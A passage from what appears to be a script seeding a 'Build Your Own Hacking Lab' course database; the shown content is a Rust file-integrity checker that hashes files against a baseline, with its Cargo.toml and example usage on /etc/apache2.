    // Check for modified and deleted files
    for (file, hash) in &baseline {
        match current.get(file) {
            Some(current_hash) => {
                if hash != current_hash {
                    modified.push(file.clone());
                }
            }
            None => {
                deleted.push(file.clone());
            }
        }
    }

    // Check for added files
    for file in current.keys() {
        if !baseline.contains_key(file) {
            added.push(file.clone());
        }
    }

    // Report
    if !modified.is_empty() {
        println!("{} MODIFIED FILES:", "[!]".red().bold());
        for file in &modified {
            println!("  {} {}", "~".red(), file.display());
        }
        println!();
    }

    if !added.is_empty() {
        println!("{} NEW FILES:", "[!]".yellow().bold());
        for file in &added {
            println!("  {} {}", "+".yellow(), file.display());
        }
        println!();
    }

    if !deleted.is_empty() {
        println!("{} DELETED FILES:", "[!]".red().bold());
        for file in &deleted {
            println!("  {} {}", "-".red(), file.display());
        }
        println!();
    }

    // Summary
    let total_changes = modified.len() + added.len() + deleted.len();
    if total_changes == 0 {
        println!("{} No changes detected. Integrity verified.", "[+]".green().bold());
    } else {
        println!("{} {} changes detected!", "[!]".red().bold(), total_changes);
        println!("  Modified: {}", modified.len());
        println!("  Added: {}", added.len());
        println!("  Deleted: {}", deleted.len());
    }
}

fn main() {
    let cli = Cli::parse();

    match cli.command {
        Commands::Baseline { path, output } => {
            create_baseline(&path, &output);
        }
        Commands::Check { path, baseline } => {
            check_integrity(&path, &baseline);
        }
    }
}
\`\`\`

### Cargo.toml
\`\`\`toml
[dependencies]
clap = { version = "4", features = ["derive"] }
sha2 = "0.10"
hex = "0.4"
walkdir = "2"
colored = "2"
\`\`\`

### Usage
\`\`\`bash
# Build
cargo build --release

# Create baseline
./integrity baseline /etc/apache2 -o apache-baseline.txt

# Later, check for changes
./integrity check /etc/apache2 -b apache-baseline.txt

# Example output:
# [*] Checking integrity of: "/etc/apache2"
# [*] Baseline: "apache-baseline.txt"
#
# [!] MODIFIED FILES:
#   ~ apache2.conf
#   ~ sites-enabled/000-default.conf
#
# [!] NEW FILES:
#   + sites-enabled/backdoor.conf
#
# [!] 3 changes detected!
#   Modified: 2
#   Added: 1
#   Deleted: 0
\`\`\``, 1, now);

console.log('Seeded: Build Your Own Hacking Lab');
console.log('  - 5 modules, 15 detailed tasks');

sqlite.close();
